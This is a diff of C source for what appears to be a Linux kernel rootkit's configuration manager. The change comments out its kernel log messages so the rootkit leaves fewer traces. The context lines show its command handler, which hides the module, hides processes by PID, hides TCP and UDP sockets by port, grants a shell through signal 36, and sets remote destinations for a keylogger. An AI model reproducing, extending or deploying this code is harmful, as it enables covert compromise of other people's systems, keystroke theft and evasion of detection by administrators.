@@ -21,7 +21,7 @@
 /*                                                                             */
 /*******************************************************************************/
 
-#include <linux/module.h>		/* Needed for printk, KERN_INFO & asmlinkage */
+#include <linux/module.h>		/* Needed for //printk, KERN_INFO & asmlinkage */
 #include <linux/string.h>		/* Needed for strlen, strncmp, strncpy & simple_strtol */
 #include <linux/sched.h>		/* Needed for ... */
 
@@ -40,7 +40,7 @@
 
 
 /* Definition of macros */
-#define PRINT(str) printk(KERN_INFO "rootkit conf_manager: %s\n", (str))
+#define PRINT(str) //printk(KERN_INFO "rootkit conf_manager: %s\n", (str))
 #define DEBUG_PRINT(str) if (show_debug_messages) PRINT(str)
 
 
@@ -140,28 +140,28 @@ static int parse_json(char *json_str)
 		if (!jsoneq(json_str, &t[i], "unload_module")) {
 			if ((flag = extract_boolean_value(json_str)) == -1)
 				continue;
-			printk(KERN_INFO "%s: %s\n", "unload_module", (flag) ? "true" : "false");
+			//printk(KERN_INFO "%s: %s\n", "unload_module", (flag) ? "true" : "false");
 			if (flag)
 				unload_module();
 
 		} else if (!jsoneq(json_str, &t[i], "hide_module")) {
 			if ((flag = extract_boolean_value(json_str)) == -1)
 				continue;
-			printk(KERN_INFO "%s: %s\n", "hide_module", (flag) ? "true" : "false");
+			//printk(KERN_INFO "%s: %s\n", "hide_module", (flag) ? "true" : "false");
 			if (flag)
 				mask_module();
 
 		} else if (!jsoneq(json_str, &t[i], "unhide_module")) {
 			if ((flag = extract_boolean_value(json_str)) == -1)
 				continue;
-			printk(KERN_INFO "%s: %s\n", "unhide_module", (flag) ? "true" : "false");
+			//printk(KERN_INFO "%s: %s\n", "unhide_module", (flag) ? "true" : "false");
 			if (flag)
 				unmask_module();
 
 		} else if (!jsoneq(json_str, &t[i], "provide_shell")) {
 			if ((flag = extract_boolean_value(json_str)) == -1)
 				continue;
-			printk(KERN_INFO "%s: %s\n", "provide_shell", (flag) ? "true" : "false");
+			//printk(KERN_INFO "%s: %s\n", "provide_shell", (flag) ? "true" : "false");
 			if (flag) {
 				memset(&info, 0, sizeof(struct siginfo));
 				info.si_signo = 36;
@@ -173,106 +173,107 @@ static int parse_json(char *json_str)
 
 			} else if (!jsoneq(json_str, &t[i], "set_keylog_dest")) {
 			count = extract_array_values(json_str);
-			printk(KERN_INFO "%s: %d\n", "keylogging_dest", count);
+			//printk(KERN_INFO "%s: %d\n", "keylogging_dest", count);
 			for (j=0 ; j<count ; j++) {
-				printk(KERN_INFO "index %d has value %s\n", j, values[j]);
+				//printk(KERN_INFO "index %d has value %s\n", j, values[j]);
 				set_remote_dest(values[j]);
 			}
 
 
 		} else if (!jsoneq(json_str, &t[i], "hide_processes")) {
 			count = extract_array_values(json_str);
-			printk(KERN_INFO "%s: %d\n", "hide_processes", count);
+			//printk(KERN_INFO "%s: %d\n", "hide_processes", count);
 			for (j=0 ; j<count ; j++) {
-				printk(KERN_INFO "index %d has value %s\n", j, values[j]);
+				//printk(KERN_INFO "index %d has value %s\n", j, values[j]);
 				pid = simple_strtol(values[j], &endptr, 10);
 				mask_process(pid);
 			}
 
 		} else if (!jsoneq(json_str, &t[i], "unhide_processes")) {
 			count = extract_array_values(json_str);
-			printk(KERN_INFO "%s: %d\n", "unhide_processes", count);
+			//printk(KERN_INFO "%s: %d\n", "unhide_processes", count);
 			for (j=0 ; j<count ; j++) {
-				printk(KERN_INFO "index %d has value %s\n", j, values[j]);
+				//printk(KERN_INFO "index %d has value %s\n", j, values[j]);
 				pid = simple_strtol(values[j], &endptr, 10);
 				unmask_process(pid);
 			}
 
 		} else if (!jsoneq(json_str, &t[i], "hide_sockets_tcp4")) {
 			count = extract_array_values(json_str);
-			printk(KERN_INFO "%s: %d\n", "hide_sockets_tcp4", count);
+			//printk(KERN_INFO "%s: %d\n", "hide_sockets_tcp4", count);
 			for (j=0 ; j<count ; j++) {
-				printk(KERN_INFO "index %d has value %s\n", j, values[j]);
+				//printk(KERN_INFO "index %d has value %s\n", j, values[j]);
 				port = simple_strtol(values[j], &endptr, 10);
 				mask_socket("tcp4", port);
 			}
 
 		} else if (!jsoneq(json_str, &t[i], "unhide_sockets_tcp4")) {
 			count = extract_array_values(json_str);
-			printk(KERN_INFO "%s: %d\n", "unhide_sockets_tcp4", count);
+			//printk(KERN_INFO "%s: %d\n", "unhide_sockets_tcp4", count);
 			for (j=0 ; j<count ; j++) {
-				printk(KERN_INFO "index %d has value %s\n", j, values[j]);
+				//printk(KERN_INFO "index %d has value %s\n", j, values[j]);
 				port = simple_strtol(values[j], &endptr, 10);
 				unmask_socket("tcp4", port);
 			}
 
 		} else if (!jsoneq(json_str, &t[i], "hide_sockets_tcp6")) {
 			count = extract_array_values(json_str);
-			printk(KERN_INFO "%s: %d\n", "hide_sockets_tcp6", count);
+			//printk(KERN_INFO "%s: %d\n", "hide_sockets_tcp6", count);
 			for (j=0 ; j<count ; j++) {
-				printk(KERN_INFO "index %d has value %s\n", j, values[j]);
+				//printk(KERN_INFO "index %d has value %s\n", j, values[j]);
 				port = simple_strtol(values[j], &endptr, 10);
 				mask_socket("tcp6", port);
 			}
 
 		} else if (!jsoneq(json_str, &t[i], "unhide_sockets_tcp6")) {
 			count = extract_array_values(json_str);
-			printk(KERN_INFO "%s: %d\n", "unhide_sockets_tcp6", count);
+			//printk(KERN_INFO "%s: %d\n", "unhide_sockets_tcp6", count);
 			for (j=0 ; j<count ; j++) {
-				printk(KERN_INFO "index %d has value %s\n", j, values[j]);
+				//printk(KERN_INFO "index %d has value %s\n", j, values[j]);
 				port = simple_strtol(values[j], &endptr, 10);
 				unmask_socket("tcp6", port);
 			}
 
 		} else if (!jsoneq(json_str, &t[i], "hide_sockets_udp4")) {
 			count = extract_array_values(json_str);
-			printk(KERN_INFO "%s: %d\n", "hide_sockets_udp4", count);
+			//printk(KERN_INFO "%s: %d\n", "hide_sockets_udp4", count);
 			for (j=0 ; j<count ; j++) {
-				printk(KERN_INFO "index %d has value %s\n", j, values[j]);
+				//printk(KERN_INFO "index %d has value %s\n", j, values[j]);
 				port = simple_strtol(values[j], &endptr, 10);
 				mask_socket("udp4", port);
 			}
 
 		} else if (!jsoneq(json_str, &t[i], "unhide_sockets_udp4")) {
 			count = extract_array_values(json_str);
-			printk(KERN_INFO "%s: %d\n", "unhide_sockets_udp4", count);
+			//printk(KERN_INFO "%s: %d\n", "unhide_sockets_udp4", count);
 			for (j=0 ; j<count ; j++) {
-				printk(KERN_INFO "index %d has value %s\n", j, values[j]);
+				//printk(KERN_INFO "index %d has value %s\n", j, values[j]);
 				port = simple_strtol(values[j], &endptr, 10);
 				unmask_socket("udp4", port);
 			}
 
 		} else if (!jsoneq(json_str, &t[i], "hide_sockets_udp6")) {
 			count = extract_array_values(json_str);
-			printk(KERN_INFO "%s: %d\n", "hide_sockets_udp6", count);
+			//printk(KERN_INFO "%s: %d\n", "hide_sockets_udp6", count);
 			for (j=0 ; j<count ; j++) {
-				printk(KERN_INFO "index %d has value %s\n", j, values[j]);
+				//printk(KERN_INFO "index %d has value %s\n", j, values[j]);
 				port = simple_strtol(values[j], &endptr, 10);
 				mask_socket("udp6", port);
 			}
 
 		} else if (!jsoneq(json_str, &t[i], "unhide_sockets_udp6")) {
 			count = extract_array_values(json_str);
-			printk(KERN_INFO "%s: %d\n", "unhide_sockets_udp6", count);
+			//printk(KERN_INFO "%s: %d\n", "unhide_sockets_udp6", count);
 			for (j=0 ; j<count ; j++) {
-				printk(KERN_INFO "index %d has value %s\n", j, values[j]);
+				//printk(KERN_INFO "index %d has value %s\n", j, values[j]);
 				port = simple_strtol(values[j], &endptr, 10);
 				unmask_socket("udp6", port);
 			}
 
 		} else {
-			printk(KERN_INFO "Unexpected key: %.*s\n", t[i].end-t[i].start,
-					json_str + t[i].start);
+			//printk(KERN_INFO "Unexpected key: %.*s\n", t[i].end-t[i].start,
+			//		json_str + t[i].start);
+			;
 		}
 
 	return 0;
